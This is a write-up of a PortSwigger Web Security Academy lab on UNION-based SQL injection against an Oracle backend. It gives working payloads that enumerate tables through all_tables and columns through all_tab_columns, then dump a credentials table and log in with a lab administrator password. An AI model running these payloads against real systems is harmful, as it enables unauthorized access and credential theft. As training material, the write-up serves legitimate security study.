# SQL Injection Attack — Listing Database Contents on Oracle

**Lab:** SQL injection attack, listing the database contents on Oracle
**Source:** PortSwigger Web Security Academy
**Category:** SQL Injection
**Difficulty:** Practitioner

## Description

The product category filter is vulnerable to SQL injection, with results reflected in the response. The database backend is Oracle. The application has a login function, and the database contains a table holding usernames and passwords — but the table and column names are unknown. Goal is to discover them via Oracle's data dictionary views, dump the credentials, and log in as `administrator`.

## Solution

### Step 1: List all tables

Oracle doesn't have `information_schema`. Instead, used the Oracle-specific `all_tables` view to enumerate every table:

```sql
' UNION SELECT table_name, NULL FROM all_tables--
```

This returned a long list of Oracle system tables mixed with application tables, including one standing out: `USERS_YDTTJB`.

![Table listing from all_tables](content/assets/portswigger_sqli_oracle_contents/01-tables-listing.png)

### Step 2: List the columns of the real users table

Queried `all_tab_columns` (Oracle's equivalent of `information_schema.columns`) to find the real column names:

```sql
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_YDTTJB'--
```

This revealed the relevant columns: `USERNAME_YJGUTL` and `PASSWORD_EIYWBX`.

![Column names for USERS_YDTTJB](content/assets/portswigger_sqli_oracle_contents/02-column-names.png)

### Step 3: Dump the credentials

With table and column names known, queried the actual data:

```sql
' UNION SELECT USERNAME_YJGUTL, PASSWORD_EIYWBX FROM USERS_YDTTJB--
```

This returned all user credentials, including:

```
administrator : 3dus6wcgkwduzacfc9p2
```

![Dumped username/password pairs including administrator](content/assets/portswigger_sqli_oracle_contents/03-dumped-credentials.png)

### Step 4: Log in as administrator

Used the recovered credentials on the login form:

- **Username:** `administrator`
- **Password:** `3dus6wcgkwduzacfc9p2`

![Login form filled with administrator credentials](content/assets/portswigger_sqli_oracle_contents/04-login-form.png)

### Result

Logged in successfully as `administrator`. Lab solved.

## Flag / Result

```
Logged in as administrator — lab solved
```

## Takeaway

Oracle has no `information_schema`. Use `all_tables` to list tables and `all_tab_columns` to list a table's columns instead. Same overall UNION-based enumeration approach as other databases, just different data dictionary views.
